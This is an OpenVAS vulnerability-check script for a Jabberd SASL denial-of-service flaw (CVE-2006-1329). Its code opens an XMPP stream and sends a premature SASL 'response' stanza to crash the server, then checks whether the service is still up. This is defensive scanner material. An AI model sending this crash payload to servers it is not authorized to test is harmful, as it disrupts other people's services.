###############################################################################
# OpenVAS Vulnerability Test
#
# Jabber Studio Jabberd Server SASL Negotiation Denial of Service Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802825");
  script_version("2022-04-27T12:01:52+0000");
  script_cve_id("CVE-2006-1329");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2022-04-27 12:01:52 +0000 (Wed, 27 Apr 2022)");
  script_tag(name:"creation_date", value:"2012-04-02 13:27:16 +0530 (Mon, 02 Apr 2012)");
  script_name("Jabber Studio Jabberd Server SASL Negotiation DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("xmpp_detect.nasl");
  script_require_ports("Services/xmpp-server", 5347);
  script_mandatory_keys("xmpp/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/19281");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17155");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/25334");
  script_xref(name:"URL", value:"http://article.gmane.org/gmane.network.jabber.admin/27372");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Jabber Studio jabberd Server version before 2.0s11.");

  script_tag(name:"insight", value:"The flaw is caused due to an error within the handling of SASL
  negotiation. This can be exploited to cause a crash by sending a 'response' stanza before an
  'auth' stanza.");

  script_tag(name:"solution", value:"Update to version 2.0s11 or later.");

  script_tag(name:"summary", value:"Jabberd server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("port_service_func.inc");

port = service_get_port(default:5347, proto:"xmpp-server");

if(!soc = open_sock_tcp(port))
  exit(0);

req1 = string('<?xml version="1.0"?>\n',
              '<stream:stream to="xyz.com"\n',
              'xmlns="jabber:client"\n',
              'xmlns:stream="http://etherx.jabber.org/streams"\n',
              'xml:lang="en" version="1.0">\n');

send(socket:soc, data:req1);
resp = recv(socket:soc, length:1024);

if(resp && "jabber.org" >< resp && "xmpp-sasl" >< resp) {
  # nb: A SASL'response' req
  req2 = "<response xmlns='urn:ietf:params:xml:ns:xmpp-sasl'> **** </response>";
  send(socket:soc, data:req2);
  resp = recv(socket:soc, length:1024);
}
close(soc);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
}

close(soc2);

exit(0);
